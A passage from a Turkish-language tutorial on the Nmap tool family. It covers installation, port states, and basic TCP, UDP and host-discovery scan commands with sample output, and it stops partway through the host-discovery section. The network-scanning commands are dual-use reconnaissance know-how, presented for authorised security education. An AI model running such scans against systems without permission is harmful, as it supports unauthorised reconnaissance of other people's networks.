# Nmap Araç Ailesi: Kapsamlı Pratik Kullanım Rehberi

**Sürüm:** 1.0
**Son Güncelleme:** [30-05-2025]

## 📜 İçindekiler

1.  [Giriş ve Temel Kavramlar](#1-giriş-ve-temel-kavramlar)
    *   [1.1 Projenin Amacı ve Hedef Kitle](#11-projenin-amacı-ve-hedef-kitle)
    *   [1.2 Araçların Kısa Tanıtımı](#12-araçların-kısa-tanıtımı)
    *   [1.3 Neden Bu Araçlar Kritik Öneme Sahip?](#13-neden-bu-araçlar-kritik-öneme-sahip)
    *   [1.4 Yasal Uyarı ve Etik Kullanım](#14-yasal-uyarı-ve-etik-kullanım)
    *   [1.5 Lisans Bilgisi](#15-lisans-bilgisi)
2.  [Kurulum Rehberi](#2-kurulum-rehberi)
    *   [2.1 Linux](#21-linux)
    *   [2.2 Windows](#22-windows)
    *   [2.3 macOS](#23-macos)
    *   [2.4 Ortam Değişkeni Ayarları](#24-ortam-değişkeni-ayarları)
    *   [2.5 GUI Alternatifleri (Zenmap)](#25-gui-alternatifleri-zenmap)
    *   [2.6 Kurulum Doğrulama](#26-kurulum-doğrulama)
3.  [Nmap - Ağ Tarama ve Güvenlik Denetim Aracı](#3-nmap---ağ-tarama-ve-güvenlik-denetim-aracı)
    *   [3.1 Nmap Temel Kavramları](#31-nmap-temel-kavramları)
    *   [3.2 Temel Nmap Komutları](#32-temel-nmap-komutları)
    *   [3.3 Servis ve Versiyon Tespiti](#33-servis-ve-versiyon-tespiti)
    *   [3.4 İşletim Sistemi Tespiti](#34-işletim-sistemi-tespiti)
    *   [3.5 Nmap Scripting Engine (NSE)](#35-nmap-scripting-engine-nse)
    *   [3.6 Zamanlama ve Performans](#36-zamanlama-ve-performans)
    *   [3.7 Firewall/IDS Atlatma ve Gizlenme](#37-firewallids-atlatma-ve-gizlenme)
    *   [3.8 Çıktı Formatları ve Yönetimi](#38-çıktı-formatları-ve-yönetimi)
    *   [3.9 İleri Seviye Nmap Uygulamaları](#39-ileri-seviye-nmap-uygulamaları)
    *   [3.10 Nmap Örnek Senaryoları](#310-nmap-örnek-senaryoları)
4.  [Ncat - Ağ Bağlantıları ve Veri Aktarımı](#4-ncat---ağ-bağlantıları-ve-veri-aktarımı)
    *   [4.1 Ncat Temel Kavramları](#41-ncat-temel-kavramları)
    *   [4.2 Temel Ncat Komutları](#42-temel-ncat-komutları)
    *   [4.3 Orta Seviye Ncat Uygulamaları](#43-orta-seviye-ncat-uygulamaları)
    *   [4.4 İleri Seviye Ncat Uygulamaları](#44-ileri-seviye-ncat-uygulamaları)
    *   [4.5 Ncat Örnek Senaryoları](#45-ncat-örnek-senaryoları)
5.  [Nping - Ağ Paketi Oluşturma ve Analiz Aracı](#5-nping---ağ-paketi-oluşturma-ve-analiz-aracı)
    *   [5.1 Nping Temel Kavramları](#51-nping-temel-kavramları)
    *   [5.2 Temel Nping Komutları](#52-temel-nping-komutları)
    *   [5.3 Orta Seviye Nping Uygulamaları](#53-orta-seviye-nping-uygulamaları)
    *   [5.4 İleri Seviye Nping Uygulamaları](#54-ileri-seviye-nping-uygulamaları)
    *   [5.5 Nping Örnek Senaryoları](#55-nping-örnek-senaryoları)
6.  [Ndiff - Tarama Sonuçlarını Karşılaştırma Aracı](#6-ndiff---tarama-sonuçlarını-karşılaştırma-aracı)
    *   [6.1 Ndiff Temel Kavramları](#61-ndiff-temel-kavramları)
    *   [6.2 Temel Ndiff Komutları](#62-temel-ndiff-komutları)
    *   [6.3 Orta ve İleri Seviye Ndiff Uygulamaları](#63-orta-ve-ileri-seviye-ndiff-uygulamaları)
    *   [6.4 Ndiff Örnek Senaryoları](#64-ndiff-örnek-senaryoları)
7.  [Karışık Örnek Senaryolar ve Entegre Kullanım](#7-karışık-örnek-senaryolar-ve-entegre-kullanım)
    *   [7.1 Kapsamlı Keşif ve İzleme](#71-kapsamlı-keşif-ve-izleme)
    *   [7.2 Kapsamlı Güvenlik Denetimi Akışı](#72-kapsamlı-güvenlik-denetimi-akışı)
    *   [7.3 DevOps ve Otomasyon Entegrasyonu](#73-devops-ve-otomasyon-entegrasyonu)
8.  [Cheatsheet (Hızlı Komutlar)](#8-cheatsheet-hızlı-komutlar)
    *   [8.1 Nmap Cheatsheet](#81-nmap-cheatsheet)
    *   [8.2 Ncat Cheatsheet](#82-ncat-cheatsheet)
    *   [8.3 Nping Cheatsheet](#83-nping-cheatsheet)
    *   [8.4 Ndiff Cheatsheet](#84-ndiff-cheatsheet)
9.  [Ek Bilgiler ve Kaynaklar](#9-ek-bilgiler-ve-kaynaklar)
    *   [9.1 İlgili RFC'ler ve Standartlar](#91-ilgili-rfcler-ve-standartlar)
    *   [9.2 Alternatif Araçlar](#92-alternatif-araçlar)
    *   [9.3 Önerilen Kaynaklar (Kitap, Blog, Video)](#93-önerilen-kaynaklar-kitap-blog-video)
    *   [9.4 Glosary / Terimler Sözlüğü](#94-glosary--terimler-sözlüğü)
    *   [9.5 Katkıda Bulunma](#95-katkıda-bulunma)

---

## 1. Giriş ve Temel Kavramlar

### 1.1 Projenin Amacı ve Hedef Kitle

Bu rehberin temel amacı, Nmap araç ailesinin (Nmap, Ncat, Nping, Ndiff) pratik kullanımını, gerçek dünya senaryolarını ve adım adım örnekleri içeren kapsamlı bir kaynak sunmaktır. Teorik bilgiden ziyade, "nasıl yapılır?" sorusuna odaklanarak, kullanıcıların bu güçlü araçları günlük görevlerinde, ağ yönetiminde ve siber güvenlik testlerinde etkin bir şekilde kullanmalarını sağlamaktır.

**Hedef Kitle:**

*   Siber Güvenlik Meraklıları ve Öğrencileri
*   Sistem Yöneticileri
*   Ağ Mühendisleri
*   Pentester'lar (Sızma Testi Uzmanları) ve Güvenlik Araştırmacıları
*   DevOps Mühendisleri
*   Ağ ve güvenlik konularına ilgi duyan herkes.

### 1.2 Araçların Kısa Tanıtımı

*   **Nmap (Network Mapper):** Ağları keşfetmek, açık portları taramak, çalışan servisleri ve bu servislerin versiyonlarını belirlemek, işletim sistemlerini tahmin etmek ve ağdaki güvenlik açıklarını tespit etmek için kullanılan, son derece güçlü ve esnek bir açık kaynaklı ağ tarama aracıdır.
*   **Ncat (Netcat):** Ağ üzerinden veri okuma, yazma, yönlendirme ve dinleme işlemleri için çok yönlü bir komut satırı aracıdır. TCP, UDP ve SSL üzerinden bağlantılar kurabilir, port dinleyebilir, basit sunucular veya istemciler oluşturabilir, dosya transferi yapabilir ve hatta shell bağlantıları (bind/reverse shell) sağlayabilir. "Ağların İsviçre Çakısı" olarak da bilinir.
*   **Nping (Network Packet Generation):** Ağ ana bilgisayarlarına özel olarak hazırlanmış paketler göndermek ve yanıtları analiz etmek için kullanılan bir Nmap aracıdır. Geleneksel `ping` yardımcı programından çok daha esnektir; TCP, UDP, ICMP ve ARP protokollerini kullanarak özel paketler oluşturup gönderebilir. Ağ sorunlarını gidermek, güvenlik duvarı kurallarını test etmek ve ağ performansını analiz etmek için idealdir.
*   **Ndiff (Nmap Diff):** İki farklı Nmap XML tarama sonucunu karşılaştırarak aralarındaki farkları (örneğin, yeni açılan veya kapanan portlar, değişen servis versiyonları, yeni keşfedilen hostlar) gösteren bir araçtır. Ağ yapılandırmasındaki veya güvenlik duruşundaki değişiklikleri izlemek için çok kullanışlıdır.

### 1.3 Neden Bu Araçlar Kritik Öneme Sahip?

Nmap araç ailesi, siber güvenlik ve ağ yönetimi alanlarında aşağıdaki nedenlerden dolayı vazgeçilmezdir:

*   **Kapsamlı Ağ Keşfi:** Ağdaki aktif cihazları, açık portları ve çalışan servisleri detaylı bir şekilde haritalandırır. Bu, bir ağın envanterini çıkarmak ve potansiyel saldırı yüzeyini anlamak için ilk adımdır.
*   **Güvenlik Açığı Tespiti:** Nmap Scripting Engine (NSE) sayesinde, bilinen zafiyetleri tarayabilir, yanlış yapılandırmaları ortaya çıkarabilir ve sistemlerin güvenlik duruşunu değerlendirebilir.
*   **Servis Doğrulama ve Sorun Giderme:** Sistem yöneticileri, servislerin doğru portlarda çalışıp çalışmadığını, beklenen yanıtları verip vermediğini Nmap ve Ncat ile kontrol edebilir. Nping, ağ bağlantı sorunlarını daha derinlemesine analiz etmek için kullanılabilir.
*   **Sızma Testi (Pentesting):** Pentester'lar için hedef sistemler hakkında bilgi toplama (reconnaissance), zafiyet analizi ve hatta bazı durumlarda exploit sonrası aşamalarda (Ncat ile reverse shell) temel araçlardır.
*   **Otomasyon ve Entegrasyon:** Komut satırı arayüzleri ve çeşitli çıktı formatları (özellikle XML), bu araçların scriptlerle ve diğer güvenlik araçlarıyla kolayca entegre edilmesini sağlar. Bu, tekrarlayan görevlerin otomasyonu ve büyük ölçekli analizler için kritiktir.
*   **Değişiklik Yönetimi:** Ndiff, ağdaki ve sistemlerdeki değişiklikleri (planlı veya plansız) takip ederek güvenlik duruşunun zaman içinde nasıl evrildiğini anlamaya yardımcı olur.
*   **Esneklik ve Özelleştirilebilirlik:** Çok sayıda seçenek ve NSE gibi özellikler sayesinde, taramalar ve ağ etkileşimleri son derece özelleştirilebilir.

Kısacası, bu araçlar bir ağın "gözleri ve kulakları" gibi davranarak yöneticilere ve güvenlik uzmanlarına derinlemesine görünürlük ve kontrol sağlar.

### 1.4 Yasal Uyarı ve Etik Kullanım

⚠️ **ÖNEMLİ UYARI:** Bu rehberde paylaşılan bilgiler ve araçlar **yalnızca eğitim, araştırma ve yasal test amaçlıdır.** Bu araçları **kesinlikle ve yalnızca açıkça izin aldığınız sistemlerde ve ağlarda** kullanın. İzin alınmamış sistemlere yönelik yapılacak her türlü tarama veya erişim denemesi yasa dışı kabul edilebilir ve ciddi yasal sonuçlar doğurabilir.

**Etik Kullanım İlkeleri:**

1.  **İzin Alın:** Herhangi bir sistemi taramadan önce sistem sahibinden yazılı izin alın.
2.  **Zarar Vermeyin:** Tarama faaliyetlerinizin hedef sistemlerin normal işleyişini aksatmamasına özen gösterin. Özellikle agresif tarama seçeneklerini veya DoS simülasyonlarını kullanırken dikkatli olun.
3.  **Gizliliğe Saygı Gösterin:** Tarama sonuçlarında elde edebileceğiniz hassas bilgilere saygılı olun ve bu bilgileri sorumlu bir şekilde yönetin.
4.  **Sorumlu Açıklama:** Eğer bir güvenlik açığı tespit ederseniz, bunu sorumlu bir şekilde ilgili sistem sahibine veya yetkili birime bildirin.

Bu rehberin veya katkıda bulunanların, araçların yasa dışı veya etik olmayan kullanımından kaynaklanabilecek herhangi bir zarardan veya yasal sorumluluktan dolayı mesul tutulamayacağını unutmayın. **Bilgiyi iyilik için kullanın.**

### 1.5 Lisans Bilgisi

Nmap ve Nmap ile birlikte dağıtılan Ncat, Nping, Ndiff gibi araçlar genellikle Nmap Public Source License (NPSL) altında lisanslanmıştır. Bu lisans, GNU Genel Kamu Lisansı'na (GPL) dayanmakla birlikte bazı ek kısıtlamalar ve izinler içerir. En güncel lisans bilgileri için Nmap'in resmi web sitesini ([https://nmap.org/npsl/](https://nmap.org/npsl/)) kontrol etmeniz önerilir.

Bu rehberin kendisi (içerik), aksi belirtilmedikçe [MIT Lisansı](https://opensource.org/licenses/MIT) gibi açık kaynak bir lisans altında sunulabilir. Katkıda bulunmadan önce projenin `LICENSE` dosyasını kontrol edin.

---

## 2. Kurulum Rehberi

Bu bölümde Nmap, Nping, Ncat ve Ndiff araçlarının farklı işletim sistemlerine nasıl kurulacağına dair adımları bulacaksınız. Bu araçlar genellikle Nmap ana paketi ile birlikte gelir.

### 2.1 Linux

Çoğu Linux dağıtımında Nmap, paket yöneticisi aracılığıyla kolayca kurulabilir.

#### Debian/Ubuntu ve Türevleri (Mint, Kali vb.):

Terminali açın ve aşağıdaki komutları çalıştırın:
```bash
sudo apt update
sudo apt install nmap
```

#### Fedora/CentOS/RHEL:

*   **Fedora:**
    ```bash
    sudo dnf install nmap
    ```
*   **CentOS/RHEL (ve türevleri AlmaLinux, Rocky Linux):**
    ```bash
    sudo yum install nmap
    ```
    (Daha yeni sürümlerde `dnf` de kullanılabilir: `sudo dnf install nmap`)

#### Arch Linux ve Türevleri (Manjaro vb.):

```bash
sudo pacman -Syu nmap
```

### 2.2 Windows

1.  **Nmap Resmi İndirme Sayfası:** Nmap'in resmi indirme sayfasını ziyaret edin: [https://nmap.org/download.html](https://nmap.org/download.html)
2.  **Yükleyiciyi İndirin:** "Microsoft Windows binaries" bölümünden en son stabil "Setup executable" (.exe) dosyasını (örneğin, `nmap-<versiyon>-setup.exe`) indirin.
3.  **Kurulumu Çalıştırın:** İndirilen `.exe` dosyasını çalıştırın ve kurulum sihirbazındaki adımları izleyin.
    *   **Lisans Anlaşması:** Lisans anlaşmasını kabul edin.
    *   **Bileşen Seçimi:** Genellikle varsayılan bileşenler yeterlidir. Nmap, Zenmap (GUI), Ncat, Nping ve Ndiff'in seçili olduğundan emin olun.
    *   **Npcap Kurulumu:** Nmap'in Windows üzerinde düzgün çalışabilmesi için bir paket yakalama kütüphanesi olan **Npcap**'in kurulması gereklidir. Kurulum sihirbazı size Npcap'i kurmayı teklif edecektir. Bu adımı atlamayın ve Npcap'in kurulmasına izin verin. Npcap kurulumunda "WinPcap API-compatible mode" seçeneğini işaretlemek, eski uygulamalarla uyumluluk sağlayabilir.
    *   **Kurulum Dizini:** Varsayılan kurulum dizinini (`C:\Program Files (x86)\Nmap`) kullanabilir veya değiştirebilirsiniz.
    *   **Kurulumu Tamamlayın:** Kurulum tamamlandıktan sonra "Finish" butonuna tıklayın.

### 2.3 macOS

#### Homebrew ile (Önerilen Yöntem):

Eğer Mac'inizde Homebrew paket yöneticisi kuruluysa (kurulu değilse [https://brew.sh](https://brew.sh) adresinden kurabilirsiniz), terminali açın ve şu komutu çalıştırın:
```bash
brew install nmap
```
Homebrew, Nmap ve bağımlılıklarını sizin için otomatik olarak yönetecektir.

#### Resmi Yükleyici ile:

1.  **Nmap Resmi İndirme Sayfası:** Nmap'in resmi indirme sayfasını ziyaret edin: [https://nmap.org/download.html](https://nmap.org/download.html)
2.  **DMG Dosyasını İndirin:** "Mac OS X binaries" bölümünden en son stabil ".dmg" dosyasını (örneğin, `nmap-<versiyon>.dmg`) indirin.
3.  **Yükleyiciyi Çalıştırın:** İndirilen `.dmg` dosyasını açın. İçinde bir `.pkg` yükleyici dosyası göreceksiniz. Bu dosyayı çalıştırın ve ekrandaki kurulum adımlarını izleyin.

### 2.4 Ortam Değişkeni Ayarları

Çoğu durumda, Nmap yükleyicileri (özellikle Windows ve macOS için olanlar) Nmap'in komut satırı araçlarının bulunduğu dizini sisteminizin `PATH` ortam değişkenine otomatik olarak ekler. Bu, terminalden veya komut isteminden doğrudan `nmap`, `ncat` gibi komutları çalıştırabilmenizi sağlar.

Eğer komutlar tanınmıyorsa (örn: "command not found" hatası alıyorsanız), `PATH`'i manuel olarak ayarlamanız gerekebilir:

*   **Windows:**
    1.  "Bu Bilgisayar"a (This PC) sağ tıklayıp "Özellikler"i (Properties) seçin.
    2.  "Gelişmiş sistem ayarları"na (Advanced system settings) tıklayın.
    3.  "Ortam Değişkenleri..." (Environment Variables...) butonuna tıklayın.
    4.  "Sistem değişkenleri" (System variables) altında "Path" değişkenini bulun, seçin ve "Düzenle..." (Edit...) butonuna tıklayın.
    5.  "Yeni" (New) diyerek Nmap'in kurulu olduğu dizini ekleyin (genellikle `C:\Program Files (x86)\Nmap`).
    6.  Tüm pencereleri "Tamam" (OK) diyerek kapatın. Değişikliklerin etkili olması için yeni bir komut istemi (cmd) veya PowerShell penceresi açmanız gerekebilir.

*   **Linux/macOS:**
    Genellikle paket yöneticileri veya resmi yükleyiciler bunu doğru şekilde ayarlar. Eğer sorun yaşarsanız, Nmap'in nerede kurulduğunu (`which nmap` komutuyla bulabilirsiniz) ve bu dizinin `~/.bashrc`, `~/.zshrc` veya `~/.profile` gibi shell yapılandırma dosyanızdaki `PATH` değişkenine ekli olup olmadığını kontrol edin.
    Örneğin, `~/.bashrc` dosyasına şunu ekleyebilirsiniz (yolu kendi kurulumunuza göre ayarlayın):
    ```bash
    export PATH=$PATH:/usr/local/bin/nmap  # Örnek bir yol
    ```
    Değişikliklerin geçerli olması için `source ~/.bashrc` komutunu çalıştırın veya yeni bir terminal açın.

### 2.5 GUI Alternatifleri (Zenmap)

Nmap, öncelikli olarak bir komut satırı aracı olmasına rağmen, **Zenmap** adında resmi bir grafik arayüzü (GUI) de sunar. Zenmap:

*   Nmap komutlarını ve seçeneklerini görsel bir arayüz üzerinden oluşturmayı kolaylaştırır.
*   Tarama sonuçlarını daha organize bir şekilde gösterir.
*   Farklı tarama profillerini kaydetme ve kullanma imkanı sunar.
*   Özellikle Nmap'e yeni başlayanlar için komutları öğrenme ve deneme aşamasında faydalı olabilir.

Zenmap genellikle Nmap ana paketiyle birlikte kurulur (Windows ve macOS yükleyicilerinde bir seçenek olarak sunulur, Linux'ta ise bazen ayrı bir paket olarak `zenmap` adıyla kurulması gerekebilir).

**Zenmap'i başlatmak için:**
*   Linux/macOS: Terminalde `zenmap` yazın veya uygulama menüsünden bulun.
*   Windows: Başlat Menüsü'nden Zenmap'i bulun.

Ancak bu rehber, araçların tam potansiyelini ve otomasyon yeteneklerini ortaya koymak için **komut satırı kullanımına odaklanacaktır.**

### 2.6 Kurulum Doğrulama

Nmap ve diğer araçların doğru bir şekilde kurulup kurulmadığını ve `PATH` değişkeninin doğru ayarlanıp ayarlanmadığını kontrol etmek için bir terminal veya komut istemi açın ve aşağıdaki komutları tek tek çalıştırın:

```bash
nmap --version
```
Çıktı şuna benzer olmalıdır:
```
Nmap version 7.94 ( https://nmap.org )
Platform: x86_64-pc-linux-gnu
Compiled with: liblua-5.4.4 openssl-3.0.11 libssh2-1.11.0 libz-1.2.13 libpcre-8.39 nmap-libpcap-1.10.4 nmap-libdnet-1.12 ipv6
Compiled without:
Available nsock engines: epoll poll select
```

```bash
ncat --version
```
Çıktı şuna benzer olmalıdır:
```
Ncat: Version 7.94 ( https://nmap.org/ncat )
```

```bash
nping --version
```
Çıktı şuna benzer olmalıdır:
```
Nping version 0.7.94 ( https://nmap.org/nping )
```

```bash
ndiff --version
```
Çıktı şuna benzer olmalıdır:
```
Ndiff version 1.05 (https://nmap.org/ndiff/)
```

Eğer bu komutlar versiyon bilgilerini sorunsuz bir şekilde gösteriyorsa, kurulumunuz başarılı olmuş demektir ve araçları kullanmaya hazırsınız!

---

## 3. Nmap - Ağ Tarama ve Güvenlik Denetim Aracı

Nmap (Network Mapper), ağları keşfetmek, hostları ve servisleri tespit etmek, işletim sistemlerini belirlemek ve güvenlik açıklarını taramak için kullanılan, endüstri standardı haline gelmiş açık kaynaklı bir araçtır. Bu bölümde Nmap'in temelinden ileri seviye kullanımlarına kadar geniş bir yelpazede bilgi sunulacaktır.

### 3.1 Nmap Temel Kavramları

Nmap'i etkili kullanabilmek için bazı temel kavramları anlamak önemlidir:

*   **Host (Ana Bilgisayar):** Ağ üzerindeki IP adresine sahip herhangi bir cihaz (sunucu, bilgisayar, yazıcı, router vb.).
*   **Port:** Bir host üzerinde çalışan belirli bir uygulama veya servise ağ üzerinden erişmek için kullanılan sanal bir uç noktadır. Portlar 0 ile 65535 arasında numaralandırılır.
    *   **Well-known Ports (0-1023):** Standartlaşmış servisler için ayrılmıştır (örn: HTTP için 80, HTTPS için 443, FTP için 21, SSH için 22).
    *   **Registered Ports (1024-49151):** Belirli uygulamalar tarafından kaydedilmiş portlardır.
    *   **Dynamic/Private Ports (49152-65535):** Geçici veya özel kullanımlar için ayrılmıştır.
*   **Port Durumları:** Nmap bir portu taradığında, o portun durumunu aşağıdaki altı şekilde raporlayabilir:
    1.  **`open` (Açık):** Hedef hosttaki bir uygulama bu port üzerinden TCP bağlantılarını, UDP datagramlarını veya SCTP ilişkilendirmelerini aktif olarak kabul ediyor. Bu, genellikle taramanın birincil hedefidir.
    2.  **`closed` (Kapalı):** Port erişilebilir (ICMP port unreachable gibi bir yanıt alınır veya TCP RST paketi döner) ancak üzerinde dinleyen bir uygulama yok. Bir hostun canlı olduğunu ve IP adresinin kullanıldığını gösterir, ancak o portta bir servis çalışmadığını belirtir.
    3.  **`filtered` (Filtrelenmiş):** Nmap, portun açık olup olmadığını belirleyemiyor çünkü bir güvenlik duvarı, filtre veya başka bir ağ engeli Nmap'in problarını engelliyor. Problara yanıt gelmeyebilir veya ICMP administratively prohibited gibi bir hata dönebilir.
    4.  **`unfiltered` (Filtrelenmemiş):** Port erişilebilir, ancak Nmap açık mı kapalı mı olduğunu belirleyemiyor. Sadece TCP ACK taraması (`-sA`) bu durumu raporlar ve genellikle bir güvenlik duvarının varlığını ancak kurallarını tam olarak anlayamadığını gösterir.
    5.  **`open|filtered` (Açık|Filtrelenmiş):** Nmap, portun açık mı yoksa filtrelenmiş mi olduğunu ayırt edemiyor. UDP, IP protokol, FIN, NULL ve Xmas taramaları bu durumu raporlayabilir.
    6.  **`closed|filtered` (Kapalı|Filtrelenmiş):** Nmap, portun kapalı mı yoksa filtrelenmiş mi olduğunu ayırt edemiyor. Sadece IP ID Idle scan (`-sI`) bu durumu raporlar.

*   **Tarama Teknikleri:** Nmap, portların durumunu belirlemek için çeşitli tarama teknikleri kullanır. En yaygın olanları şunlardır:
    *   **TCP SYN Scan (`-sS`):** "Yarı açık" tarama olarak da bilinir. Tam bir TCP bağlantısı kurmadan (SYN gönderir, SYN/ACK alırsa port açık, RST alırsa kapalı, yanıt yoksa filtrelenmiş) port durumunu anlamaya çalışır. Hızlıdır ve genellikle loglarda daha az iz bırakır. Root/Administrator yetkisi gerektirir.
    *   **TCP Connect Scan (`-sT`):** İşletim sisteminin `connect()` sistem çağrısını kullanarak tam bir TCP üçlü el sıkışması (three-way handshake) kurmaya çalışır. Bağlantı başarılı olursa port açık, başarısız olursa (RST) kapalıdır. Root yetkisi gerektirmez ancak daha yavaştır ve loglarda daha belirgindir.
    *   **UDP Scan (`-sU`):** UDP portlarını tarar. UDP bağlantısız bir protokol olduğu için daha karmaşıktır. Boş bir UDP paketi (veya servise özel bir payload) gönderilir. Yanıt gelmezse port `open|filtered` olabilir. ICMP port unreachable mesajı dönerse port `closed` kabul edilir. Bazı servisler yanıt verirse `open` olarak işaretlenir. Yavaştır ve güvenilirliği TCP taramalarına göre daha düşüktür.
    *   **Diğer Taramalar:** FIN, NULL, Xmas (`-sF`, `-sN`, `-sX`), ACK (`-sA`), Window (`-sW`), Maimon (`-sM`) gibi daha özelleşmiş TCP tarama teknikleri de vardır. Bunlar genellikle güvenlik duvarlarını ve IDS'leri atlatmak veya daha detaylı analiz yapmak için kullanılır.

*   **Host Keşfi (Ping Scan):** Bir tarama başlamadan önce Nmap, hangi hedeflerin "canlı" (aktif ve yanıt verir durumda) olduğunu belirlemeye çalışır. Varsayılan olarak ICMP echo request, TCP SYN (port 443), TCP ACK (port 80) ve ICMP timestamp request gönderir.

### 3.2 Temel Nmap Komutları

Nmap komutları genellikle `nmap [Tarama Tipi(leri)] [Seçenekler] {Hedef(ler)}` formatındadır.

#### Hedef Belirtme

Nmap'e taranacak hedefleri çeşitli şekillerde belirtebilirsiniz:

*   **Tek IP Adresi:**
    ```bash
    nmap 192.168.1.1
    ```
*   **Hostname (Alan Adı):**
    ```bash
    nmap scanme.nmap.org
    nmap example.com
    ```
    *Nmap, hostname'i otomatik olarak IP adresine çözecektir.*
*   **CIDR Notasyonu (Ağ Aralığı):**
    ```bash
    nmap 192.168.1.0/24  # 192.168.1.0 - 192.168.1.255 arasını tarar
    nmap 10.0.0.0/8
    ```
*   **IP Adresi Aralığı:**
    ```bash
    nmap 192.168.1.1-100  # 192.168.1.1 ile 192.168.1.100 arasını tarar (dahil)
    nmap 192.168.1-5.1-10 # 192.168.1.1, 192.168.1.2 ... 192.168.5.10 gibi
    ```
*   **Virgülle Ayrılmış Liste:**
    ```bash
    nmap 192.168.1.1,192.168.1.5,192.168.1.10
    ```
*   **Dosyadan Hedef Listesi Okuma (`-iL`):**
    Bir metin dosyasının her satırına bir hedef yazarak Nmap'e bu listeyi taramasını söyleyebilirsiniz.
    `hedefler.txt` içeriği:
    ```
    192.168.1.1
    scanme.nmap.org
    10.0.0.0/28
    ```
    Komut:
    ```bash
    nmap -iL hedefler.txt
    ```
*   **Rastgele Hedef Seçimi (`-iR`):**
    Belirli sayıda rastgele internet hostu seçer ve tarar. **DİKKAT: İzin almadığınız sistemleri taramak yasa dışıdır! Bu seçenek genellikle araştırma amaçlı ve yasal sınırlar içinde kullanılır.**
    ```bash
    nmap -iR 10  # 10 rastgele host tarar
    ```
*   **Hariç Tutma (`--exclude`, `--excludefile`):**
    Belirli hostları veya ağları tarama dışı bırakmak için kullanılır.
    ```bash
    nmap 192.168.1.0/24 --exclude 192.168.1.1,192.168.1.5
    nmap 192.168.1.0/24 --excludefile cikartilacaklar.txt
    ```

#### Temel Port Taramaları

*   **TCP Connect Scan (`-sT`):**
    İşletim sisteminin `connect()` çağrısını kullanarak tam TCP bağlantısı kurmaya çalışır.
    *   **Kullanım:** `nmap -sT <hedef>`
    *   **Ne Zaman Kullanılır?:** Root/Administrator yetkiniz olmadığında veya SYN taramasının filtrelendiği durumlarda.
    *   **Avantajları:** Root yetkisi gerektirmez.
    *   **Dezavantajları:** Daha yavaştır, loglarda daha belirgindir ve bazı IDS'ler tarafından kolayca tespit edilebilir.
    ```bash
    nmap -sT scanme.nmap.org
    ```
    Örnek Çıktı:
    ```
    Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-27 10:00 UTC
    Nmap scan report for scanme.nmap.org (45.33.32.156)
    Host is up (0.15s latency).
    Not shown: 995 closed tcp ports (conn-refused)
    PORT    STATE SERVICE
    22/tcp  open  ssh
    25/tcp  filtered smtp
    80/tcp  open  http
    135/tcp filtered msrpc
    443/tcp filtered https

    Nmap done: 1 IP address (1 host up) scanned in 12.34 seconds
    ```
    **Yorumlama:** 22 (ssh) ve 80 (http) portları açık. 25, 135, 443 portları ise filtrelenmiş (muhtemelen bir güvenlik duvarı tarafından engelleniyor). 995 port ise kapalı (bağlantı reddedildi).

*   **TCP SYN Scan (`-sS`):**
    "Yarı açık" tarama olarak da bilinir. Nmap'in varsayılan tarama türüdür (root/admin yetkisi varsa).
    *   **Kullanım:** `nmap -sS <hedef>`
    *   **Ne Zaman Kullanılır?:** Root/Administrator yetkiniz olduğunda ve hızlı, daha az iz bırakan bir tarama istediğinizde.
    *   **Avantajları:** Hızlıdır, tam bağlantı kurmadığı için loglarda daha az iz bırakma potansiyeli vardır.
    *   **Dezavantajları:** Root/Administrator yetkisi gerektirir. Bazı eski veya basit IDS'ler yine de tespit edebilir.
    ```bash
    sudo nmap -sS scanme.nmap.org
    ```
    Çıktı, `-sT` ile benzer olacaktır ancak tarama mekanizması farklıdır.

*   **UDP Scan (`-sU`):**
    UDP portlarını tarar.
    *   **Kullanım:** `nmap -sU <hedef>`
    *   **Ne Zaman Kullanılır?:** DNS (53), SNMP (161/162), DHCP (67/68) gibi önemli UDP servislerini kontrol etmek için.
    *   **Zorlukları:** UDP bağlantısız olduğu için taraması yavaştır ve güvenilirliği TCP'ye göre düşüktür. Çoğu UDP portu yanıt vermez, bu da `open|filtered` durumuna yol açar. Servis versiyon tespiti (`-sV`) UDP taramalarının doğruluğunu artırabilir.
    ```bash
    sudo nmap -sU -p 53,161 scanme.nmap.org
    ```
    Örnek Çıktı (genellikle `-sV` ile daha anlamlı olur):
    ```
    Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-27 10:05 UTC
    Nmap scan report for scanme.nmap.org (45.33.32.156)
    Host is up (0.16s latency).
    PORT    STATE         SERVICE
    53/udp  open|filtered domain
    161/udp open|filtered snmp

    Nmap done: 1 IP address (1 host up) scanned in 2.08 seconds
    ```
    **Yorumlama:** 53 ve 161 UDP portları ya açık ya da filtrelenmiş. Daha net sonuç için `-sV` eklenmelidir.

#### Port Belirtme Seçenekleri

Varsayılan olarak Nmap, en popüler 1000 TCP portunu ve eğer UDP taraması istenirse ilgili UDP portlarını tarar.

*   **Tek Port (`-p <port>`):**
    ```bash
    nmap -p 80 scanme.nmap.org
    ```
*   **Port Aralığı (`-p <başlangıç>-<bitiş>`):**
    ```bash
    nmap -p 1-1024 scanme.nmap.org
    ```
*   **Belirli Portlar (virgülle ayrılmış):**
    ```bash
    nmap -p 21,22,23,25,80,443,3389 scanme.nmap.org
    ```
*   **Protokol Belirterek Port (`-p T:<port_listesi>,U:<port_listesi>`):**
    ```bash
    nmap -p T:22,80,U:53,161 scanme.nmap.org # TCP 22,80 ve UDP 53,161
    ```
*   **Tüm Portlar (`-p-` veya `-p 0-65535`):**
    Tüm 65535 portu tarar. **Çok zaman alabilir!**
    ```bash
    nmap -p- scanme.nmap.org
    ```
*   **Hızlı Tarama (`-F`):**
    Nmap'in listesindeki en popüler 100 portu tarar. `-p-`'ye göre çok daha hızlıdır.
    ```bash
    nmap -F scanme.nmap.org
    ```
*   **En Popüler N Port (`--top-ports <sayı>`):**
    Belirtilen sayı kadar en popüler portu tarar.
    ```bash
    nmap --top-ports 20 scanme.nmap.org # En popüler 20 portu tarar
    ```
*   **Servis Adına Göre (`-p <servis_adı>`):**
    Nmap, `/etc/services` (Linux/macOS) veya eşdeğer bir dosyadan servis adını porta çevirir.
    ```bash
    nmap -p http,https,ssh scanme.nmap.org
    ```

#### Host Keşfi (Ping Taraması)

Nmap, varsayılan olarak port taramasına geçmeden önce hedeflerin canlı olup olmadığını kontrol eder.

*   **Sadece Host Keşfi (`-sn`):**
    Port taraması yapmaz, sadece hedeflerin canlı olup olmadığını (ping'e yanıt verip vermediğini) kontrol eder. Ağdaki aktif cihazları hızlıca listelemek için kullanışlıdır.
    ```bash
    nmap -sn 192.168.1.0/24
    ```
    Örnek Çıktı:
    ```
